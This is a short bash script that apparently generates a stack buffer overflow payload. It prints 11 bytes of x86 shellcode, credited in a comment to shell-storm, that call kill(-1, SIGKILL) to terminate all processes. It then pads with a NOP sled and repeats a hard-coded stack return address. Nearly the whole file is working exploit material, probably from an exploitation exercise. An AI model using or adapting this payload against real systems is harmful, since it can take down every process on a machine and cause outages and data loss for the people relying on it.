#!/bin/bash

#http://shell-storm.org/shellcode/files/shellcode-212.php
#11 bytes
#kill all processes: kill(-1, SIGKILL)

echo -ne "\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80"
for i in $(seq 12 508)
do
   echo -ne "\x90"
done

for i in 1 2
do
    echo -ne "\x1c\xd4\xff\xff"
done